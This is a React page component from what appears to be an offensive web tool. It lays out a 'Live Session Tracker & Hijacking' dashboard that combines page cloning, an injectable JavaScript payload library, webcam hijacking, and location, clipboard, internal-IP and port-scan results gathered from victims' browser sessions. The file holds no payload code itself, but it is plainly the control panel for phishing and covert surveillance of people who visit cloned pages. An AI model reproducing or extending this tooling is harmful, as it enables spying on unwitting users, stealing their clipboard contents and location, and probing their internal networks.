
'use client';

import { useState, useEffect } from 'react';
import { LiveTracker, type TrackedEvent } from '@/components/live-tracker';
import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
import { JavaScriptLibrary, type JsPayload } from '@/components/javascript-library';
import { Separator } from '@/components/ui/separator';
import { WebcamHijackTool } from '@/components/webcam-hijack-tool';
import { useLocalStorage } from '@/hooks/use-local-storage';
import { LocationTracker } from '@/components/location-tracker';
import { InternalNetworkScannerResults } from '@/components/internal-network-scanner-results';
import { PortScannerResults } from '@/components/port-scanner-results';
import { ClipboardMonitor } from '@/components/clipboard-monitor';

export default function LiveTrackerPage() {
  const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);
  const { value: sessions, setValue: setSessions } = useLocalStorage<Record<string, TrackedEvent[]>>('netra-sessions', {});
  const [selectedSessionId, setSelectedSessionId] = useState<string | null>(null);
  const [location, setLocation] = useState<{lat: number, lon: number} | null>(null);
  const [internalIps, setInternalIps] = useState<string[]>([]);
  const [openPorts, setOpenPorts] = useState<{target: string, port: number}[]>([]);
  const [clipboardContent, setClipboardContent] = useState<string | null>(null);

  const handleSelectPayload = (payload: JsPayload) => {
    setSelectedPayload(payload);
  }
  
  // Convert Record to Map for components that expect it
  const sessionsMap = new Map(Object.entries(sessions));

  const setSessionsFromMap = (newMap: Map<string, TrackedEvent[]>) => {
    setSessions(Object.fromEntries(newMap.entries()));
  };
  
  const resetStateForSession = () => {
    setLocation(null);
    setInternalIps([]);
    setOpenPorts([]);
    setClipboardContent(null);
  }

  useEffect(() => {
    if (selectedSessionId) {
        const sessionEvents = sessions[selectedSessionId] || [];
        const lastLocationEvent = sessionEvents.slice().reverse().find(e => e.type === 'location' && e.data.latitude);
        if (lastLocationEvent) {
            setLocation({ lat: lastLocationEvent.data.latitude, lon: lastLocationEvent.data.longitude });
        } else {
            setLocation(null);
        }

        const foundIps = sessionEvents
            .filter(e => e.type === 'internal-ip-found')
            .map(e => e.data.ip);
        setInternalIps([...new Set(foundIps)]);
        
        const foundPorts = sessionEvents
            .filter(e => e.type === 'port-scan-result')
            .map(e => e.data);
        setOpenPorts(foundPorts);
        
        const lastClipboardEvent = sessionEvents.slice().reverse().find(e => e.type === 'clipboard-read');
        if (lastClipboardEvent) {
            setClipboardContent(lastClipboardEvent.data.pastedText);
        } else {
            setClipboardContent(null);
        }

    } else {
        resetStateForSession();
    }
  }, [selectedSessionId, sessions]);
  
   useEffect(() => {
    // Select the first session by default if none is selected
    if (!selectedSessionId && sessionsMap.size > 0) {
      setSelectedSessionId(sessionsMap.keys().next().value);
    }
  }, [sessionsMap, selectedSessionId]);


  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Live Session Tracker & Hijacking</h1>
        <p className="text-muted-foreground">Inject JS payloads, hijack devices, and monitor real-time user interactions.</p>
      </div>

      <AdvancedPageCloner selectedPayload={selectedPayload}/>
      
      <Separator className="my-4" />
      
      <div className="grid grid-cols-1 xl:grid-cols-3 gap-6 items-start">
        <div className="xl:col-span-2 flex flex-col gap-6">
          <LiveTracker 
            sessions={sessionsMap}
            setSessions={setSessionsFromMap}
            selectedSessionId={selectedSessionId}
            setSelectedSessionId={(id) => {
              resetStateForSession();
              setSelectedSessionId(id);
            }}
          />
          <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>
        </div>
        <div className="xl:col-span-1 flex flex-col gap-6">
          <WebcamHijackTool 
            sessions={sessionsMap} 
            selectedSessionId={selectedSessionId}
            setSelectedSessionId={setSelectedSessionId}
          />
          <InternalNetworkScannerResults ips={internalIps} />
          <PortScannerResults ports={openPorts} />
          <ClipboardMonitor content={clipboardContent} />
          <LocationTracker location={location} />
        </div>
      </div>
    </div>
  );
}
